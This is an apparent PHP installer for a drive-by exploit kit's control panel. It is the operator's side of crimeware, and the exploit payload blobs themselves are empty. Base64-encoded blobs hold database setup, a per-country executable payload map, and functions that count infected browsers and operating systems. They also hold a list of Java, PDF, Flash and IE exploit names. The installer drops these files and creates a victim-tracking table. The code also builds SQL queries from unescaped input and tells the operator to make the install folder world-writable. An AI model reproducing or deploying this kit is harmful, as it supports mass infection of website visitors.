<?php
$analyticscss=base64_decode
("Lm1vZGFsRGlhbG9nIHsNCiAgICBwb3NpdGlvbjogZml4ZWQ7DQogICAgZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQogICAgdG9wOiAwOw0KICAgIHJpZ2h0OiAwOw0KICAgIGJvdHRvbTogMDsNCiAgICBsZWZ0OiAwOw0KICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC45KTsNCiAgICB6LWluZGV4OiAxMTsNCiAgICBvcGFjaXR5OjA7DQogICAgLXdlYmtpdC10cmFuc2l0aW9uOiBvcGFjaXR5IDQwMG1zIGVhc2UtaW47DQogICAgLW1vei10cmFuc2l0aW9uOiBvcGFjaXR5IDQwMG1zIGVhc2UtaW47DQogICAgdHJhbnNpdGlvbjogb3BhY2l0eSA0MDBtcyBlYXNlLWluOw0KICAgIHBvaW50ZXItZXZlbnRzOiBub25lOw0KfQ0KLm1vZGFsRGlhbG9nOnRhcmdldCB7DQogICAgb3BhY2l0eTowLjk7DQogICAgcG9pbnRlci1ldmVudHM6IGF1dG87DQp9DQoubW9kYWxEaWFsb2cgPiBkaXYgew0KICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICBtYXJnaW46IDEwJSBhdXRvOw0KICAgIHBhZGRpbmc6IDVweCAyMHB4IDEzcHggMjBweDsNCiAgICBib3JkZXItcmFkaXVzOiAzcHg7DQogICAgYmFja2dyb3VuZDogI2ZmZjsNCiAgICB3aWR0aDogNTAwcHg7DQp9DQouY2xvc2Ugew0KICAgIGJhY2tncm91bmQ6ICM2MDYwNjE7DQogICAgY29sb3I6ICNGRkZGRkY7DQogICAgbGluZS1oZWlnaHQ6IDI1cHg7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHJpZ2h0OiAtMTJweDsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgdG9wOiAtMTJweDsNCiAgICB3aWR0aDogMjRweDsNCiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiAxMnB4Ow0KICAgIC1tb3otYm9yZGVyLXJhZGl1czogMTJweDsNCiAgICBib3JkZXItcmFkaXVzOiAxMnB4Ow0KICAgIC1tb3otYm94LXNoYWRvdzogMXB4IDFweCAzcHggIzAwMDsNCiAgICAtd2Via2l0LWJveC1zaGFkb3c6IDFweCAxcHggM3B4ICMwMDA7DQogICAgYm94LXNoYWRvdzogMXB4IDFweCAzcHggIzAwMDsNCn0NCi5jbG9zZTpob3ZlciB7DQogICAgYmFja2dyb3VuZDogI0VEMTkwRTsNCn0=");
$config=base64_decode("PD9waHANCiREQkhPU1QgPSAiaG9zdG5hbWUiOw0KJERCTkFNRSA9ICJkYXRhYmFzZW5hbWUiOw0KJERCVVNFUiA9ICJ1c2VybmFtZSI7DQokREJQQVNTID0gInVzZXJwYXNzd29yZCI7DQokQURNSU5QVyA9ICJhZG1pbmhhc2giOyAvL1NIQS0xIEhhc2ggZnJvbSB5b3VyIHBhc3N3b3JkDQokQUNUSVZBVElPTl9QQVNTV09SRCA9ICJhY3RpdmF0ZWhhc2giOyAvL1NIQS0xIEhhc2ggZnJvbSB5b3VyIGFjdGl2YXRpb24gcGFzc3dvcmQNCiRCQU5USU1FID0gODY0MDA7DQokU09VTkQgPSAiRGlzYWJsZWQiOw0KJENPVU5UUklFUyA9IGFycmF5KCJSVSIgPT4gIkVYRU5BTUUuZXhlIiwgIkRFIiA9PiAiRVhFTkFNRS5leGUiLCAiVVMiID0+ICJFWEVOQU1FLmV4ZSIpOw0KPz4=");
$analytics=base64_decode
("");

	$databaseconnection=base64_decode
	("PD9waHANCnJlcXVpcmVfb25jZSggImRhdGFiYXNlZGV0YWlscy5waHAiICk7DQokY29ubmVjdGlvbj1teXNxbGlfY29ubmVjdCggJERCSE9TVCwgJERCVVNFUiwgJERCUEFTUywgJERCTkFNRSApIDsNCmlmICggIW15c3FsaV9jb25uZWN0KCAkREJIT1NULCAkREJVU0VSLCAkREJQQVNTKSApDQp7DQp9DQppZiAoICFteXNxbGlfc2VsZWN0X2RiKCAkY29ubmVjdGlvbiwkREJOQU1FICkgKQ0Kew0KfQ0KPz4=");
$exploitdb=base64_decode
	("");
$exploitselector=base64_decode
	("");

$getdetails=base64_decode
	("");
$guiek=base64_decode
	("");
$otherfunctions=base64_decode
	("PD9waHANCg0KZnVuY3Rpb24gaHNjKCAkc3RyICkgew0KICAgIHJldHVybiBodG1sc3BlY2lhbGNoYXJzKCBodG1sc3BlY2lhbGNoYXJzX2RlY29kZSggJHN0ciwgRU5UX1FVT1RFUyApLCBFTlRfUVVPVEVTICk7DQp9DQoNCmZ1bmN0aW9uIGRvNDA0KCkgew0KICAgIGhlYWRlcigiTG9jYXRpb246ICIuJE5PTlVOSVFVRVVSTCk7DQogICAgZXhpdCggKTsNCn0NCg0KZnVuY3Rpb24gcmVkaXIoICR1cmwgKSB7DQogICAgb2JfY2xlYW4oICk7DQogICAgaGVhZGVyKCAiSFRUUC8xLjEgMzAyIEZvdW5kIiApOw0KICAgIGhlYWRlciggIkxvY2F0aW9uOiB7JHVybH0iICk7DQogICAgZXhpdCggKTsNCn0NCg0KZnVuY3Rpb24gZG9wcmMoICRwYXJ0LCAkdG90YWwgKSB7DQogICAgaWYgKCAkdG90YWwgPT0gMCApIHsNCiAgICAgICAgcmV0dXJuICIwJSI7DQogICAgfQ0KICAgIHJldHVybiByb3VuZCggJHBhcnQgLyAkdG90YWwgKiAxMDAsIDIgKS4iJSI7DQp9DQpmdW5jdGlvbiB0b3RhbF9ub19vZl9oaXRzKCRjb25uZWN0aW9uKQ0Kew0KICAgJHIgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgKiBGUk9NIHN0YXRzIiApOw0KICAgJHJudW09JHItPm51bV9yb3dzOw0KICAgcmV0dXJuICRybnVtOyAgIA0KfQ0KZnVuY3Rpb24gdG90YWxfbm9fb2ZfZXhwbG9pdHMoJGNvbm5lY3Rpb24pDQp7DQogICAkciA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCAqIEZST00gZXhwbG9pdGRiIiApOw0KICAgJHJudW09JHItPm51bV9yb3dzOw0KICAgcmV0dXJuICRybnVtOyAgIA0KfQ0KZnVuY3Rpb24gdG90YWxfbm9fb2ZfdmlzaXRzKCRjb25uZWN0aW9uKQ0Kew0KICAgJHIgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgKiBGUk9NIGFuYWx5dGljcyIgKTsNCiAgICRybnVtPSRyLT5udW1fcm93czsNCiAgIHJldHVybiAkcm51bTsgICANCn0NCmZ1bmN0aW9uIHBsYXRmb3JtX2luZmVjdGVkKCRjb25uZWN0aW9uLCRjb2wpDQp7DQogICAkciA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCAqIEZST00gc3RhdHMgV0hFUkUgb3N2ZXI9J3skY29sfSciICk7DQogICAkcm51bT0kci0+bnVtX3Jvd3M7DQogICByZXR1cm4gJHJudW07ICAgDQp9DQpmdW5jdGlvbiBicm93c2VyX2luZmVjdGVkKCRjb25uZWN0aW9uLCRjb2wpDQp7DQogICAkciA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCAqIEZST00gc3RhdHMgV0hFUkUgYnJvd3R5cGU9J3skY29sfSciICk7DQogICAkcm51bT0kci0+bnVtX3Jvd3M7DQogICByZXR1cm4gJHJudW07ICAgDQp9DQpmdW5jdGlvbiBnZXRUYWJsZSgkY29ubmVjdGlvbiwkY29sKQ0Kew0KICAgJHIgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgaWQsYnJvd3R5cGUsYnJvd3Zlcixvc3ZlcixtYWMsY2xpZW50IEZST00gc3RhdHMgV0hFUkUgaWQ9eyRjb2x9IiApOw0KICAgJHJvdyA9IG15c3FsaV9mZXRjaF9yb3coICRyICk7DQogICByZXR1cm4gJHJvdzsNCn0NCmZ1bmN0aW9uIGdldEFuYWx5dGljcygkY29ubmVjdGlvbiwkY29sKQ0Kew0KICAgJHIgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgaWQsdG9kYXlfZGF0ZSxub19vZl92aXNpdG9ycyxub19vZl9oaXRzIEZST00gYW5hbHl0aWNzIFdIRVJFIGlkPXskY29sfSIgKTsNCiAgICRyb3cgPSBteXNxbGlfZmV0Y2hfcm93KCAkciApOw0KICAgcmV0dXJuICRyb3c7DQp9DQpmdW5jdGlvbiBnZXRFeHBsb2l0KCRjb25uZWN0aW9uLCRjb2wpDQp7DQogICAkciA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCAqIEZST00gZXhwbG9pdGRiIFdIRVJFIGlkPXskY29sfSIgKTsNCiAgICRyb3cgPSBteXNxbGlfZmV0Y2hfcm93KCAkciApOw0KICAgcmV0dXJuICRyb3c7DQp9DQpmdW5jdGlvbiBnZXRzdGF0cyggJGNvbm5lY3Rpb24sJGNvbCApIHsNCiAgICAkbm1zID0gYXJyYXkoICk7DQogICAgJHR0bCA9IGFycmF5KCApOw0KICAgICRlZWQgPSBhcnJheSggKTsNCiAgICAkcHJjID0gYXJyYXkoICk7DQoNCgkkciA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCBESVNUSU5DVCB7JGNvbH0gRlJPTSBzdGF0cyIgKTsNCiAgICB3aGlsZSAoICRyb3cgPSBteXNxbGlfZmV0Y2hfcm93KCAkciApICkgew0KICAgICAgICAkbm1zW10gPSAkcm93WzBdOw0KICAgICAgICAkY25tID0gYWRkc2xhc2hlcyggJHJvd1swXSApOw0KICAgICAgICAkcnQgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgQ09VTlQoKikgRlJPTSBzdGF0cyBXSEVSRSB7JGNvbH09J3skY25tfSciICk7DQogICAgICAgICRyb3d0ID0gbXlzcWxpX2ZldGNoX3JvdyggJHJ0ICk7DQogICAgICAgICR0b3RhbCA9ICRyb3d0WzBdOw0KICAgICAgICAkdHRsW10gPSAkdG90YWw7DQogICAgICAgICRydCA9IG15c3FsaV9xdWVyeSggJGNvbm5lY3Rpb24sIlNFTEVDVCBDT1VOVCgqKSBGUk9NIHN0YXRzIFdIRVJFIHskY29sfT0neyRjbm19JyBBTkQgaGl0IT0wIiApOw0KICAgICAgICAkcm93dCA9IG15c3FsaV9mZXRjaF9yb3coICRydCApOw0KICAgICAgICAkZXhwZWQgPSAkcm93dFswXTsNCiAgICAgICAgJGVlZFtdID0gJGV4cGVkOw0KICAgICAgICAkcHJjW10gPSBkb3ByYyggJGV4cGVkLCAkdG90YWwgKTsNCiAgICB9DQogICAgYXJyYXlfbXVsdGlzb3J0KCAkZWVkLCBTT1JUX0RFU0MsICR0dGwsIFNPUlRfREVTQywgJG5tcywgJHByYyApOw0KICAgIHJldHVybiBhcnJheSggJG5tcywgJHR0bCwgJGVlZCwgJHByYyApOw0KfQ0KDQoNCmZ1bmN0aW9uIGdldGV4cHN0YXRzKCRjb25uZWN0aW9uICkgew0KICAgIGdsb2JhbCAkU1BMT0lUUzsNCiAgICAkbm1zID0gYXJyYXkoICk7DQogICAgJHR0bCA9IGFycmF5KCApOw0KICAgICRyID0gbXlzcWxpX3F1ZXJ5KCAkY29ubmVjdGlvbiwiU0VMRUNUIERJU1RJTkNUIGhpdCBGUk9NIHN0YXRzIFdIRVJFIGhpdCE9MCBPUkRFUiBCWSBoaXQgQVNDIiApOw0KICAgIHdoaWxlICggJHJvdyA9IG15c3FsaV9mZXRjaF9yb3coICRyICkgKSB7DQogICAgICAgICRubXNbXSA9ICRTUExPSVRTWyRyb3dbMF1dOw0KICAgICAgICAkY25tID0gYWRkc2xhc2hlcyggJHJvd1swXSApOw0KICAgICAgICAkcnQgPSBteXNxbGlfcXVlcnkoICRjb25uZWN0aW9uLCJTRUxFQ1QgQ09VTlQoKikgRlJPTSBzdGF0cyBXSEVSRSBoaXQ9J3skY25tfSciICk7DQogICAgICAgICRyb3d0ID0gbXlzcWxpX2ZldGNoX3JvdyggJHJ0ICk7DQogICAgICAgICR0dGxbXSA9ICRyb3d0WzBdOw0KICAgIH0NCiAgICByZXR1cm4gYXJyYXkoICRubXMsICR0dGwgKTsNCn0NCiRTUExPSVRTID0gYXJyYXkoMSA9PiAiSkFWQSBUQyIsICAyID0+ICJKQVZBIFNNQiIsIDMgPT4gIkhDUCIsIDQgPT4gIlBERiBDT0xMQUIiLCA1ID0+ICJQREYgUFJJTlRGIiwgNiA9PiAiSkFWQSBSTUkiLCA3ID0+ICJGTEFTSCA5IiwgOCA9PiAiUERGIExJQlRJRkYiLCA5ID0+ICJKQVZBIE1JREkiLCAxMCA9PiAiSkFWQSBTS1lMSU5FIiwgMTEgPT4gIklFIENTUyIsIDEyID0+ICJJRVBFRVJTIiwgMTMgPT4gIkhBQ0tJTkcgQVRURU1QVCIsIDE0ID0+ICJIQUNLSU5HIEFUVEVNUFQiLCAxNSA9PiAiTURBQyIsIDE2ID0+ICJIQUNLSU5HIEFUVEVNUFQiLCAxNyA9PiAiSEFDS0lORyBBVFRFTVBUIiwgMTggPT4gIkZMQVNIIDEwIiApOw0KDQo/Pg==");
function rndvar($min,$max)
			{
				$len = mt_rand( $min, $max );
    				$chss = "abcdefghijkxy";
    				$chsg = "lmnopqrstuvwz";
				$v = "";
				$i = 0;
				for ( ; $i < $len; $i++ )
					{
						$v .= $i % 2 == 0 ? $chss[mt_rand( 0, strlen( $chss ) - 1 )] : $chsg[mt_rand( 0, strlen( $chsg ) - 1 )];
					}
				if ( mt_rand( 0, 3 ) == 0 )
					{
						$v .= mt_rand( 1, 9 );
    					}
    				return $v;
			}
function WriteFile($path,$data)
	{
		$file = $path;
		$fh = fopen($file, "w") or die("File ($file) does not exist!");
		fwrite($fh, $data);
		fclose($fh);
	}
$lang="en";
if($lang=="en")
{
echo "<!DOCTYPE html>
<html>
<head>

	<title>install</title>
	<link rel='stylesheet' type='text/css' href='installl.css'>

</head>
<body>
<div class='maindiv'>
<h1>Instructions :</h1>
<ul>
	<li>Make CHMOD 777 on the directory where this file install.php is located</li>
	<li>Create MySQL database</li>
	<li>Fill all of the fields showed below with data of created MySQL database:</li>
</ul>
<form method='POST' action='shadyantra.php' onSubmit='return onSend()'>
<table>
	<tr>
		<td><font>MySQL host:</font></td>
		<td><input name='host' id='host' type='text' placeholder='Host'></td>
	</tr>
	<tr>
		<td><font >MySQL database name:</font></td>
		<td><input name='dbname' id='dbname' type='text' placeholder='Database'></td>
	</tr>
	<tr>
		<td><font>MySQL username:</font></td>
		<td><input name='dbuname' id='dbuname' type='text' placeholder='Username'></td>
	</tr>
	<tr>
		<td><font>MySQL password:</font></td>
		<td><input name='dbupassword' id='dbupassword' type='password' placeholder='Password'></td>
	</tr>
	<tr>
		<td><font>Password to access statistics:</font></td>
		<td><input name='adminpw' id='adminpw' type='password' placeholder='Kit password'></td>
	</tr>
	<tr>
		<td><font>Repeat password:</font></td>
		<td><input name='repeatadminpw' id='repeatadminpw' type='password' placeholder='Repeat Kit Password'></td>
	</tr>
</table>	
<input type='hidden' name='language' value='en'></input>
<input type='hidden' name='path' id='path' value='path'></input>
<br>
<input type='submit' name='back' value='Back'></input>
<input type='submit' value='Install'></input>

</form>
</div>
</body>
</html>
"
;}
if (isset($_POST['back']))
{
echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php'></head></html>";
exit();
}
elseif (isset($_POST['language']))
	{
		$language=$_POST['language'];
		$DBHOST=$_POST['host'];
		$DBUSER=$_POST['dbuname'];
		$DBPASS=$_POST['dbupassword'];
		$DBNAME=$_POST['dbname'];
		$ADMINPW=$_POST['adminpw'];
		if ($language=='en')
			{
				$connection=mysqli_connect( $DBHOST, $DBUSER, $DBPASS);
				if ( !mysqli_connect( $DBHOST, $DBUSER, $DBPASS ) )
					{
						echo "Installation was not completed! Unable to connect to MySQL host. Check MySQL settings and try again.";
						exit();
					}
				if ( !mysqli_select_db( $connection, $DBNAME ) )
					{
						echo "Installation was not completed! The software was able to connect to MySQL host but created MySQL database was not found. Check database name and try again.";
						exit();
					}
				$install = mysqli_query($connection,"CREATE TABLE IF NOT EXISTS `stats` (
  				`id` int(11) unsigned NOT NULL auto_increment,
  				`ip` int(10) unsigned NOT NULL,
  				`time` int(10) unsigned NOT NULL,
  				`browver` varchar(20) NOT NULL,
  				`browtype` varchar(20) NOT NULL,
  				`osver` varchar(20) NOT NULL,
  				`mac` varchar(16) NOT NULL,
  				`client` varchar(50) NOT NULL,
  				`source` varchar(50) NOT NULL,
  				`hit` int(11) NOT NULL,
  				PRIMARY KEY  (`id`),
  				KEY `ip` (`ip`),
  				KEY `time` (`time`)
				) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;");
				if($error=mysqli_error($connection))
					{
						echo "Installation wasn't completed cuz of MySQL's error. MySQL error description:";
    						print $error;
						exit();
					}
				else
					{
						echo "<font color='green'>Creating table in database... DONE</font><br>";
						$ACTIVATION_PASSWORD=rndvar(10,15);
						$cdatatoreplace=array("hostname","username","userpassword","databasename","adminhash","activatehash");
						$cdataforreplace=array($DBHOST,$DBUSER,$DBPASS,$DBNAME,sha1($ADMINPW),sha1($ACTIVATION_PASSWORD));
						$config=str_replace($cdatatoreplace, $cdataforreplace, $config);
						WriteFile("databasedetails.php",$config);
						WriteFile("analytics.css",$analyticscss);
						WriteFile("analytics.php",$analytics);
						WriteFile("databaseconnection.php",$databaseconnection);
						WriteFile("explpoitdb.php",$exploitdb);
						WriteFile("exploitselector.php",$exploitselector);
						WriteFile("getdetails.php",$getdetails);
						WriteFile("guiek.php",$guiek);
						WriteFile("otherfunctions.php",$otherfunctions);
						
						
					}
			}
	}

?>
